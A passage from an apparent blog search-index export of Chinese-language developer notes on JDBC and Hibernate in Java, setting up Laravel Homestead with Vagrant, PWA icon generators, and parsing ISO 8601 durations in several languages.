</span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> SQLException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        String url = <span class=\"string\">\"jdbc:mysql://127.0.0.1:3306/mydb\"</span>;</span><br><span class=\"line\">        String username = <span class=\"string\">\"root\"</span>;</span><br><span class=\"line\">        String password = <span class=\"string\">\"redhat\"</span>;</span><br><span class=\"line\">        <span class=\"comment\">//Class.forName(\"com.mysql.jdbc.Driver\");</span></span><br><span class=\"line\">        DriverManager.registerDriver(<span class=\"keyword\">new</span> Driver());</span><br><span class=\"line\">        Connection connection = DriverManager.getConnection(url, username, password);</span><br><span class=\"line\">        String sql = <span class=\"string\">\"SELECT * FROM msg\"</span>;</span><br><span class=\"line\">        PreparedStatement prepareStatement = connection.prepareStatement(sql);</span><br><span class=\"line\">        ResultSet resultSet = prepareStatement.executeQuery();</span><br><span class=\"line\">        resultSet.next();</span><br><span class=\"line\">        String address = resultSet.getString(<span class=\"string\">\"address\"</span>);</span><br><span class=\"line\">        System.out.println(address);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>發現代碼，還是正常的執行了。</p>\n<p>總結一下: Class.forName 方法的作用，就是初始化給定的類。而我們給定的 MySQL 的 Driver 類中，它在靜態代碼塊中通過 JDBC 的 DriverManager 註冊了一下驅動。我們也可以直接使用 JDBC 的驅動管理器註冊 mysql 驅動，從而代替使用 Class.forName。</p>\n</blockquote>\n<p>參考來源:<a href=\"https://www.runoob.com/w3cnote/java-class-forname.html\" target=\"_blank\" rel=\"noopener\">Java class.forname 詳解 | 菜鳥教程</a></p>\n<h2 id=\"Hibernate\"><a href=\"#Hibernate\" class=\"headerlink\" title=\"Hibernate\"></a>Hibernate</h2><h2 id=\"前置設定\"><a href=\"#前置設定\" class=\"headerlink\" title=\"前置設定\"></a>前置設定</h2><h3 id=\"jar-加載\"><a href=\"#jar-加載\" class=\"headerlink\" title=\"jar 加載\"></a>jar 加載</h3><ol>\n<li>Hibernate jar 包<br>下載連結<a href=\"https://hibernate.org/orm/releases/5.4/\" target=\"_blank\" rel=\"noopener\">5.4 series - Hibernate ORM</a><br>lib/required,lib/jpa<br>底下需要載入jar</li>\n</ol>\n<ol start=\"2\">\n<li><p>Hibernate 日誌 jar 包</p>\n</li>\n<li><p>DB 驅動 Jar 包<br>MySQL JDBC驅動程式(mysql-connector-java-*.jar)</p>\n</li>\n</ol>\n<h3 id=\"Maven-設定\"><a href=\"#Maven-設定\" class=\"headerlink\" title=\"Maven 設定\"></a>Maven 設定</h3><p>設定檔原則上要放在 src 跟目錄，但</p>\n<p><a href=\"http://pclevin.blogspot.com/2015/01/hibernate-hello-world-example-xml.html\" target=\"_blank\" rel=\"noopener\">Java程式教學甘仔店: Hibernate Hello World Example 專案 之 XML Mapping</a></p>\n<h4 id=\"探討-Eclipse-加-resource-資料夾\"><a href=\"#探討-Eclipse-加-resource-資料夾\" class=\"headerlink\" title=\"探討 Eclipse 加 resource 資料夾\"></a>探討 Eclipse 加 resource 資料夾</h4><p>其中 resources 是會抓到 target<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># copy resources to target</span></span><br><span class=\"line\">cp -rf <span class=\"variable\">$PROJECT_DIR</span>/resources/* <span class=\"variable\">$PROJECT_DIR</span>/target</span><br></pre></td></tr></table></figure></p>\n<p>詳細可以看 javac 編譯:<a href=\"https://imshuai.com/using-javac\" target=\"_blank\" rel=\"noopener\">第1期：抛开IDE，了解一下javac如何编译 | 毛帅的博客</a><br>這篇可以有時間再做整理</p>\n<h2 id=\"設定-Hibernate\"><a href=\"#設定-Hibernate\" class=\"headerlink\" title=\"設定 Hibernate\"></a>設定 Hibernate</h2><h3 id=\"加入-dtd-用意\"><a href=\"#加入-dtd-用意\" class=\"headerlink\" title=\"加入 dtd 用意\"></a>加入 dtd 用意</h3><h3 id=\"設定實體類-hbm-xml\"><a href=\"#設定實體類-hbm-xml\" class=\"headerlink\" title=\"設定實體類 hbm.xml\"></a>設定實體類 hbm.xml</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"設定-Hibernate-核心檔\"><a href=\"#設定-Hibernate-核心檔\" class=\"headerlink\" title=\"設定 Hibernate 核心檔\"></a>設定 Hibernate 核心檔</h3><p>需要放在 src 底下，除非有做 resource (還需要設定 Eclipse)</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"一般實作\"><a href=\"#一般實作\" class=\"headerlink\" title=\"一般實作\"></a>一般實作</h2><ol>\n<li><p>加載 Hibernate 核心文件</p>\n</li>\n<li><p>New sessionfactory</p>\n</li>\n<li><p>使用SessionFactory 創建 Session 物件</p>\n</li>\n<li><p>開起交易</p>\n</li>\n<li><p>CRUD</p>\n</li>\n<li><p>交易提交</p>\n</li>\n<li><p>關閉資源(Session,SessionFactory)</p>\n</li>\n</ol>\n<h2 id=\"hibernate-utils\"><a href=\"#hibernate-utils\" class=\"headerlink\" title=\"hibernate utils\"></a>hibernate utils</h2><p>main 方法建置 table</p>\n<h2 id=\"session\"><a href=\"#session\" class=\"headerlink\" title=\"session\"></a>session</h2><p>save</p>\n<p>update</p>\n<p>delete</p>\n<p>get</p>\n<h2 id=\"hibernate-3-種狀態\"><a href=\"#hibernate-3-種狀態\" class=\"headerlink\" title=\"hibernate 3 種狀態\"></a>hibernate 3 種狀態</h2><ol>\n<li>瞬時態 物件匋有id，session 沒有關聯</li>\n<li>持久態 物件有id、session 有關聯<br>這邊沒有做save，當正常commit的話<br>持久態會做資料寫入到資料庫<br><strong>一級緩存還會提到</strong></li>\n<li>托管態 物件有id，session 沒有關聯</li>\n</ol>\n<h2 id=\"緩存\"><a href=\"#緩存\" class=\"headerlink\" title=\"緩存\"></a>緩存</h2><h3 id=\"一級緩存\"><a href=\"#一級緩存\" class=\"headerlink\" title=\"一級緩存\"></a>一級緩存</h3><p>通常使用</p>\n<p>持久態 沒做 save/update，交易 commit 時候會寫入到資料庫</p>\n<h3 id=\"二級緩存\"><a href=\"#二級緩存\" class=\"headerlink\" title=\"二級緩存\"></a>二級緩存</h3><p>默認不使用</p>\n<p>通常現在使用 redis 代替</p>\n<p>生命週期是 SessionFactory</p>\n<h2 id=\"getCurrentSession\"><a href=\"#getCurrentSession\" class=\"headerlink\" title=\"getCurrentSession\"></a>getCurrentSession</h2><p>threadlocal</p>\n<h3 id=\"不用-close\"><a href=\"#不用-close\" class=\"headerlink\" title=\"不用 close\"></a>不用 close</h3><h3 id=\"不用在大量資料-test\"><a href=\"#不用在大量資料-test\" class=\"headerlink\" title=\"不用在大量資料 test\"></a>不用在大量資料 test</h3><h2 id=\"三種-API\"><a href=\"#三種-API\" class=\"headerlink\" title=\"三種 API\"></a>三種 API</h2><h3 id=\"Query\"><a href=\"#Query\" class=\"headerlink\" title=\"Query\"></a>Query</h3><p>使用 HQL</p>\n<p>介於 實體類 和 SQL 之間</p>\n<h3 id=\"Criteria\"><a href=\"#Criteria\" class=\"headerlink\" title=\"Criteria\"></a>Criteria</h3><p>使用實體類</p>\n<h3 id=\"SQLQuery\"><a href=\"#SQLQuery\" class=\"headerlink\" title=\"SQLQuery\"></a>SQLQuery</h3><p>原生 SQL </p>\n<h2 id=\"Entity-建立\"><a href=\"#Entity-建立\" class=\"headerlink\" title=\"Entity 建立\"></a>Entity 建立</h2><p><a href=\"https://bbs.huaweicloud.com/blogs/151905\" target=\"_blank\" rel=\"noopener\">Hibernate入门之主键生成策略详解_博客<em>云社区</em>开发者中心-华为云</a><br><a href=\"http://netkiller.sourceforge.net/spring/data/spring-data-jpa.html\" target=\"_blank\" rel=\"noopener\">5.4. Spring Data with MySQL</a></p>\n<h2 id=\"實體類關聯\"><a href=\"#實體類關聯\" class=\"headerlink\" title=\"實體類關聯\"></a>實體類關聯</h2><h3 id=\"一對多\"><a href=\"#一對多\" class=\"headerlink\" title=\"一對多\"></a>一對多</h3><p>通常</p>\n<h4 id=\"進階探討\"><a href=\"#進階探討\" class=\"headerlink\" title=\"進階探討\"></a>進階探討</h4><p><a href=\"https://www.cnblogs.com/chiangchou/p/mappedby.html\" target=\"_blank\" rel=\"noopener\">hibernate基于注解的维护权反转：@OneToMany(mappedBy=) - bojiangzhou - 博客园</a></p>\n<h4 id=\"1-設定\"><a href=\"#1-設定\" class=\"headerlink\" title=\"1. 設定\"></a>1. 設定</h4><h4 id=\"2-聯級\"><a href=\"#2-聯級\" class=\"headerlink\" title=\"2. 聯級\"></a>2. 聯級</h4><h3 id=\"多對多\"><a href=\"#多對多\" class=\"headerlink\" title=\"多對多\"></a>多對多</h3><p><a href=\"https://www.cnblogs.com/rubekid/p/4621975.html\" target=\"_blank\" rel=\"noopener\">@ManyToMany中间表附加字段设计 - rubekid - 博客园</a></p>\n<p><a href=\"https://www.cnblogs.com/mjbrian/p/6873113.html\" target=\"_blank\" rel=\"noopener\">Hibernate中多对多的annotation的写法（中间表可以有多个字段） - MJBrian - 博客园</a></p>\n<h3 id=\"一對一\"><a href=\"#一對一\" class=\"headerlink\" title=\"一對一\"></a>一對一</h3><p><a href=\"https://blog.csdn.net/u012045597/article/details/15701235\" target=\"_blank\" rel=\"noopener\">Hibernate —— HQL与QBC的区别_tuxq5721-CSDN博客_hql和qbc</a></p>\n<h2 id=\"問題\"><a href=\"#問題\" class=\"headerlink\" title=\"問題\"></a>問題</h2><h3 id=\"org-hibernate-ObjectNotFoundException\"><a href=\"#org-hibernate-ObjectNotFoundException\" class=\"headerlink\" title=\"org.hibernate.ObjectNotFoundException\"></a>org.hibernate.ObjectNotFoundException</h3><p><a href=\"https://www.cnblogs.com/cn-chy-com/p/8810374.html\" target=\"_blank\" rel=\"noopener\">org.hibernate.ObjectNotFoundException: No row with the given identifier exists - keepup~ - 博客园</a><br>org.hibernate.ObjectNotFoundException: No row with the given identifier exists</p>\n<h3 id=\"hibernate-gt-Spring-Data-JPA\"><a href=\"#hibernate-gt-Spring-Data-JPA\" class=\"headerlink\" title=\"hibernate -&gt; Spring Data JPA\"></a>hibernate -&gt; Spring Data JPA</h3><p><a href=\"http://cw1057.blogspot.com/2013/11/spring-hibernate-spring-data-jpa.html?m=1\" target=\"_blank\" rel=\"noopener\">Java Artisan / Neil Chan: 從 Spring + Hibernate 到 Spring Data JPA</a></p>\n<p><a href=\"https://www.xncoding.com/2017/07/03/spring/sb-hibernate.html\" target=\"_blank\" rel=\"noopener\">SpringBoot系列 - 集成Hibernate | 飞污熊博客</a></p>\n<p><a href=\"https://sites.google.com/a/mis.nsysu.edu.tw/cheng-shi-zi-xun-wang/java-ee-jin-jie-pian/hibernate-ji-shu/ji-chu-ru-men/jian-dan-fan-li/di-yi-gehibernate-cheng-shi\" target=\"_blank\" rel=\"noopener\">第一個hibernate程式 - 國立中山大學程式諮詢網</a></p>\n<h2 id=\"junit-使用-spring-做-DAO-查詢，最外層沒辦法做-dao-查詢\"><a href=\"#junit-使用-spring-做-DAO-查詢，最外層沒辦法做-dao-查詢\" class=\"headerlink\" title=\"junit 使用 spring 做 DAO 查詢，最外層沒辦法做 dao 查詢\"></a>junit 使用 spring 做 DAO 查詢，最外層沒辦法做 dao 查詢</h2><ul>\n<li><p><a href=\"https://toments.com/2125588/\" target=\"_blank\" rel=\"noopener\">「快學springboot」在springboot中寫單元測試 - Toments 找話題</a></p>\n</li>\n<li><p><a href=\"https://stackoverflow.com/questions/734614/spring-hibernate-junit-no-hibernate-session-bound-to-thread\" target=\"_blank\" rel=\"noopener\">Spring / Hibernate / JUnit - No Hibernate Session bound to Thread - Stack Overflow</a></p>\n</li>\n</ul>\n<h2 id=\"Hibernate-Set-List\"><a href=\"#Hibernate-Set-List\" class=\"headerlink\" title=\"Hibernate Set / List\"></a>Hibernate Set / List</h2><p><a href=\"https://blog.csdn.net/nthack5730/article/details/45201665\" target=\"_blank\" rel=\"noopener\">【学习笔记】Hibernate中多对多不用List而用Set的原因分析<em>机智猫-CSDN博客</em>多对多关系用set还是list</a></p>\n<p><a href=\"https://www.jianshu.com/p/23af676b3977\" target=\"_blank\" rel=\"noopener\">Hibernate的抓取策略及优化 - 簡書</a><br><a href=\"https://stackoverflow.com/questions/161224/what-are-the-differences-between-the-different-saving-methods-in-hibernate\" target=\"_blank\" rel=\"noopener\">java - What are the differences between the different saving methods in Hibernate? - Stack Overflow</a></p>\n","categories":["Java"],"tags":["hibernate","java","dao"]},{"title":"Homestead 架設 Laravel 環境小記","url":"/blog/2019/06/16/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/","content":"<p>小記 Homestead 使用方法</p>\n<a id=\"more\"></a>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>使用 Homestead 簡單來說就是不用再本機安裝 laravel, composer 等指令<br>也能建立 project<br>所以把要建立新的專案，先做 homestead.yaml 設定<br>進去 vagrant ssh<br>可以在該資料夾下，下 laravel , composer 等等指令</p>\n<h2 id=\"安裝-vagrant-和-Virtualbox\"><a href=\"#安裝-vagrant-和-Virtualbox\" class=\"headerlink\" title=\"安裝 vagrant 和 Virtualbox\"></a>安裝 vagrant 和 Virtualbox</h2><p>參考:<a href=\"https://ithelp.ithome.com.tw/articles/10193858\" target=\"_blank\" rel=\"noopener\">第 15 天：以 Vagrant 建置 PHP/Laravel 開發環境 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<h3 id=\"VirtualBox\"><a href=\"#VirtualBox\" class=\"headerlink\" title=\"VirtualBox\"></a>VirtualBox</h3><p>安裝可以直接<code>apt install virtualbox</code><br>但這邊網路上是直接抓 deb</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install ./virtualbox-5.2_5.2.4-119785~Ubuntu~xenial_amd64.deb</span><br></pre></td></tr></table></figure>\n<h3 id=\"vagrant\"><a href=\"#vagrant\" class=\"headerlink\" title=\"vagrant\"></a>vagrant</h3><p>去官網抓 deb</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install ./vagrant_2.0.1_x86_64.deb</span><br></pre></td></tr></table></figure>\n<p>我有用 rubygem 安裝<br>但就是不能用，用 deb 安裝會比較順利</p>\n<h2 id=\"安裝-Homestead\"><a href=\"#安裝-Homestead\" class=\"headerlink\" title=\"安裝 Homestead\"></a>安裝 Homestead</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vagrant box add laravel/homestead</span><br></pre></td></tr></table></figure>\n<h2 id=\"Homestead-設定工具\"><a href=\"#Homestead-設定工具\" class=\"headerlink\" title=\"Homestead 設定工具\"></a>Homestead 設定工具</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/laravel/homestead.git Homestead</span><br><span class=\"line\">// 可以用 git tag 和有哪些版本</span><br><span class=\"line\">git checkout v8.5.1</span><br></pre></td></tr></table></figure>\n<p>首先說一下，沒設定 ssh 金鑰要先執行<br><code>ssh-keygen -t rsa -b 4096 -C &quot;{您的 Email}&quot;</code> 指令產生金鑰。<br>是為了<code>vagrant ssh</code>用的</p>\n<p>更詳細設定<br><a href=\"https://ithelp.ithome.com.tw/articles/10193858\" target=\"_blank\" rel=\"noopener\">第 15 天：以 Vagrant 建置 PHP/Laravel 開發環境 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<h2 id=\"修改-Homestead-yaml\"><a href=\"#修改-Homestead-yaml\" class=\"headerlink\" title=\"修改 Homestead.yaml\"></a>修改 Homestead.yaml</h2><p>首先，在 homestead 目錄執行<code>bash init.sh</code><br>設定 Homestead.yaml</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">ip:</span> <span class=\"string\">\"192.168.10.10\"</span></span><br><span class=\"line\"><span class=\"attr\">memory:</span> <span class=\"number\">2048</span></span><br><span class=\"line\"><span class=\"attr\">cpus:</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"attr\">provider:</span> <span class=\"string\">virtualbox</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">authorize:</span> <span class=\"string\">~/.ssh/id_rsa.pub</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">keys:</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">~/.ssh/id_rsa</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">folders:</span></span><br><span class=\"line\"><span class=\"attr\">  - map:</span> <span class=\"string\">~/quickstart2</span></span><br><span class=\"line\"><span class=\"attr\">    to:</span> <span class=\"string\">/home/vagrant/code</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">sites:</span></span><br><span class=\"line\"><span class=\"attr\">  - map:</span> <span class=\"string\">homestead.test</span></span><br><span class=\"line\"><span class=\"attr\">    to:</span> <span class=\"string\">/home/vagrant/code/public</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">databases:</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">homestead</span></span><br><span class=\"line\"><span class=\"comment\"># ports:</span></span><br><span class=\"line\"><span class=\"comment\">#     - send: 50000</span></span><br><span class=\"line\"><span class=\"comment\">#       to: 5000</span></span><br><span class=\"line\"><span class=\"comment\">#     - send: 7777</span></span><br><span class=\"line\"><span class=\"comment\">#       to: 777</span></span><br><span class=\"line\"><span class=\"comment\">#       protocol: udp</span></span><br></pre></td></tr></table></figure>\n<p>主要設定有 folders<br>要把 map 設定自己程式路徑<br>to 不需要調整</p>\n<p>有更多安裝可以看官網文件<br><a href=\"https://laravel.com/docs/5.8/homestead#installing-elasticsearch\" target=\"_blank\" rel=\"noopener\">Laravel Homestead - Laravel - The PHP Framework For Web Artisans</a></p>\n<p>執行 Homestead<br><code>vagrant ssh</code></p>\n<p>再做</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">composer install</span><br><span class=\"line\">php artisan migrate</span><br></pre></td></tr></table></figure>\n<p>這時候自己的<code>http://localhost:8000</code><br>可以看到東西</p>\n<h2 id=\"一些-homestead-yml-設定\"><a href=\"#一些-homestead-yml-設定\" class=\"headerlink\" title=\"一些 homestead.yml 設定\"></a>一些 homestead.yml 設定</h2><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">databases:</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">homestead</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">test1</span></span><br></pre></td></tr></table></figure>\n<p>vagrant 執行的時候會建立 databases<br>算是滿方便的功能</p>\n<p>帳號/密碼<br>user: homestead<br>pass: secret</p>\n<p><a href=\"https://learnku.com/laravel/t/1245/laravel51homestead-027-development-environment-deployment-and-settings\" target=\"_blank\" rel=\"noopener\">Laravel5.1/Homestead (0.2.7) 开发环境的部署和设置 | Laravel China 社区</a><br><a href=\"https://learnku.com/laravel/wikis/25530\" target=\"_blank\" rel=\"noopener\">Laravel Homestead：所有配置详解 | Laravel China 社区</a><br><a href=\"https://learnku.com/laravel/wikis/25541\" target=\"_blank\" rel=\"noopener\">Laravel Homestead：设置 Cron 计划任务 | Laravel China 社区</a></p>\n<p>簡單完成 Laravel Task 架設<br><a href=\"https://github.com/laravel/quickstart-basic/tree/0f8346968b2121edf4ac70bf0183821a87929b19\" target=\"_blank\" rel=\"noopener\">laravel/quickstart-basic at 0f8346968b2121edf4ac70bf0183821a87929b19</a><br><a href=\"https://learnku.com/docs/laravel/5.1/quickstart-intermediate/1049\" target=\"_blank\" rel=\"noopener\">中级任务清单 |《Laravel 5.1 中文文档》| Laravel China 社区</a></p>\n<p><a href=\"https://learnku.com/articles/18697\" target=\"_blank\" rel=\"noopener\">Laravel Cron 定时任务 “跳坑” 点 | Laravel China 社区</a></p>\n<p><strong>2019-10-29</strong></p>\n<h2 id=\"Homestead-設定多個-Project-方法\"><a href=\"#Homestead-設定多個-Project-方法\" class=\"headerlink\" title=\"Homestead 設定多個 Project 方法\"></a>Homestead 設定多個 Project 方法</h2><p>其實這篇沒有做 host 動作<br>直接 127.0.0.1 就可以連到 Laravel Project<br>但一個 VM 跑一個 Project 感覺不是很夠用</p>\n<p>但這個只能手動加入/etc/hosts</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">folders:</span><br><span class=\"line\">    - map: ~/laravel-webpaste</span><br><span class=\"line\">      to: /home/vagrant/code</span><br><span class=\"line\">    - map: ~/quickstart2</span><br><span class=\"line\">      to: /home/vagrant/code2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sites:</span><br><span class=\"line\">    - map: homestead.test</span><br><span class=\"line\">      to: /home/vagrant/code/public</span><br><span class=\"line\">    - map: homestead.test2</span><br><span class=\"line\">      to: /home/vagrant/code2/public</span><br></pre></td></tr></table></figure>\n<p>folders 設定程式掛載路徑</p>\n<p>sites 設定 hosts 網域路徑</p>\n<p><code>vagrant reload --provision</code> 會重啟 VM 跑設定</p>\n<p>這時候再設定本機(非VM)<code>/etc/host</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.10.10 homestead.test</span><br><span class=\"line\">192.168.10.10 homestead.test2</span><br></pre></td></tr></table></figure>\n<p>開瀏覽器輸入兩個網址就能打開<br><a href=\"http://homestead.test\" target=\"_blank\" rel=\"noopener\">http://homestead.test</a><br><a href=\"http://homestead.test2\" target=\"_blank\" rel=\"noopener\">http://homestead.test2</a></p>\n<p>有沒有自動設定 host 方法呢?</p>\n<h2 id=\"Vagrant-設定-hosts-自動化方法\"><a href=\"#Vagrant-設定-hosts-自動化方法\" class=\"headerlink\" title=\"Vagrant 設定 hosts 自動化方法\"></a>Vagrant 設定 hosts 自動化方法</h2><p><a href=\"https://learnku.com/articles/16186/homestead-hosts-file-automation-vagrant-hostsupdater-and\" target=\"_blank\" rel=\"noopener\">解放雙手 hosts 自動化 (Vagrant-hostsupdater) | Laravel China 社區</a><br><a href=\"https://www.pilishen.com/posts/setting-hosts-file-automatically-through-host-updater\" target=\"_blank\" rel=\"noopener\">【Homestead Master 08】还在手动修改hosts文件？-pilishen.com,做全球最好的实战教程</a></p>\n<p>非常簡單，兩個步驟</p>\n<ol>\n<li><p>vagrant plugin install vagrant-hostsupdater</p>\n</li>\n<li><p>vagrant reload –provision</p>\n</li>\n</ol>\n<p>可以查看 <code>/etc/hosts</code> 會自動添加 hosts 資料</p>\n<p>題外話<br><del>目前好奇 <code>vagrant reload --provision</code> 一般 user 下執行</del><br><del>竟然可以改變 root 644 <code>/etc/hosts</code> 檔案</del><br><del>有空再研究分析</del><br>原來之前下過 sudo<br>所以剛剛執行沒有跳出來<br>vagrant reload –provision<br>會跳出打 root 密碼</p>\n","categories":["Laravel"],"tags":["larvel","vagrant"]},{"title":"ICON 快速產生小記","url":"/blog/2021/06/02/ICON-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%B0%8F%E8%A8%98/","content":"<p>最近簡單做一個PWA<br>但是一次要產生各種大小的圖<br><del>我覺得好麻煩</del></p>\n<a id=\"more\"></a>\n<p>這邊找到幾個網路上找到得資源</p>\n<!--more-->\n<p>Android 可用</p>\n<p><a href=\"https://www.pwabuilder.com/imageGenerator\" target=\"_blank\" rel=\"noopener\">PWABuilder</a></p>\n<p>這邊決 IOS</p>\n<p>IOS 可用</p>\n<p><a href=\"https://appicon.co/\" target=\"_blank\" rel=\"noopener\">App Icon Generator</a></p>\n<p>我邊是用 180px</p>\n<p>其他</p>\n<p><a href=\"https://romannurik.github.io/AndroidAssetStudio/icons-launcher.html#foreground.type=clipart&amp;foreground.clipart=android&amp;foreground.space.trim=1&amp;foreground.space.pad=0.25&amp;foreColor=rgba(96%2C%20125%2C%20139%2C%200\" target=\"_blank\" rel=\"noopener\">Android Asset Studio - Launcher icon generator</a>&amp;backColor=rgb(68%2C%20138%2C%20255)&amp;crop=0&amp;backgroundShape=square&amp;effects=none&amp;name=ic_launcher)</p>\n<p>參考來源:<br><a href=\"https://stackoverflow.com/questions/49568333/pwa-icons-are-not-used-in-ios-11-3\" target=\"_blank\" rel=\"noopener\">mobile safari - PWA icons are not used in iOS 11.3 - Stack Overflow</a></p>\n","categories":["實用工具"],"tags":["android","icon","ios"]},{"title":"ISO 8601 duration 時間標準小記","url":"/blog/2019/10/01/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/","content":"<p>最近發現串接的 API 有這種格式<code>&quot;P3Y6M4DT12H30M5S&quot;</code><br>第一次看到這種好奇是什麼東西<br>發現是一個標準格式 <strong>ISO 8601 duration</strong></p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PnYnMnDTnHnMnS</span><br><span class=\"line\">PnW</span><br><span class=\"line\">P&lt;date&gt;T&lt;time&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>“P3Y6M4DT12H30M5S” 就表示 “3年6個月4天12小時又30分5秒”，</p>\n</blockquote>\n<p>看這麼一連串字，覺得很難看到<br>但其實舊時一個英文搭配數字組合方式</p>\n<h2 id=\"現成-Library\"><a href=\"#現成-Library\" class=\"headerlink\" title=\"現成 Library\"></a>現成 Library</h2><h3 id=\"momentjs\"><a href=\"#momentjs\" class=\"headerlink\" title=\"momentjs\"></a>momentjs</h3><p><a href=\"https://momentjs.com/docs/#/durations/\" target=\"_blank\" rel=\"noopener\">Moment.js | Docs</a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">moment.duration(<span class=\"string\">'P3Y6M4DT12H30M5S'</span>,<span class=\"string\">'minutes'</span>).toString();</span><br><span class=\"line\"><span class=\"string\">\"P3Y6M4DT12H30M5S\"</span></span><br><span class=\"line\">moment.duration(<span class=\"string\">'P3Y6M4DT12H30M5S'</span>,<span class=\"string\">'minutes'</span>).humanize()</span><br><span class=\"line\"><span class=\"string\">\"4 years\"</span></span><br><span class=\"line\">moment.duration(<span class=\"string\">'P3Y6M4DT12H30M5S'</span>,<span class=\"string\">'minutes'</span>).minutes()</span><br><span class=\"line\"><span class=\"number\">30</span></span><br><span class=\"line\">moment.duration(<span class=\"string\">'P3Y6M4DT12H30M5S'</span>,<span class=\"string\">'minutes'</span>).as(<span class=\"string\">'hours'</span>)</span><br><span class=\"line\"><span class=\"number\">30780.50138888889</span></span><br><span class=\"line\">moment.duration(<span class=\"string\">'P3Y6M4DT12H30M5S'</span>,<span class=\"string\">'minutes'</span>).toISOString()</span><br><span class=\"line\"><span class=\"string\">\"P3Y6M4DT12H30M5S\"</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/moment/moment/issues/463\" target=\"_blank\" rel=\"noopener\">Duration missing features · Issue #463 · moment/moment</a></p>\n<h4 id=\"換成好看的時間\"><a href=\"#換成好看的時間\" class=\"headerlink\" title=\"換成好看的時間\"></a>換成好看的時間</h4><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">moment.utc(moment.duration(<span class=\"string\">'P3Y6M4DT12H30M5S'</span>).asMilliseconds()).format(<span class=\"string\">\"HH:mm\"</span>);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.tcs.de/format-a-moment-duration-as-hours-and-minutes/\" target=\"_blank\" rel=\"noopener\">Format a moment duration as Hours and Minutes · TCS Blog</a></p>\n<h3 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h3><p>java.time.Duration</p>\n<p><a href=\"http://hklifenote.blogspot.com/2016/03/parse-iso-8601-duration.html\" target=\"_blank\" rel=\"noopener\">生活記事簿: Parse ISO 8601 duration 的方法</a></p>\n<h3 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h3><p><a href=\"https://www.php.net/manual/en/dateinterval.construct.php\" target=\"_blank\" rel=\"noopener\">PHP: DateInterval::__construct - Manual</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$interval = <span class=\"keyword\">new</span> DateInterval(<span class=\"string\">'P2Y4DT6H8M'</span>);</span><br><span class=\"line\">var_dump($interval);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.php.net/manual/en/dateinterval.format.php\" target=\"_blank\" rel=\"noopener\">PHP: DateInterval::format - Manual</a></p>\n<p>另外 DB 要怎麼紀錄這種資料呢?<br><a href=\"https://stackoverflow.com/questions/42837852/what-mysql-datatype-to-store-a-php-dateinterval\" target=\"_blank\" rel=\"noopener\">What MySQL datatype to store a PHP DateInterval - Stack Overflow</a><br>這邊裡面有提到用 varchar<br>但我覺得存 int 會比較好</p>\n<p>先記錄到這邊，有發現好用的在紀錄</p>\n","categories":["程式心法"],"tags":["duration"]},{"title":"ISO 8601 時間格式 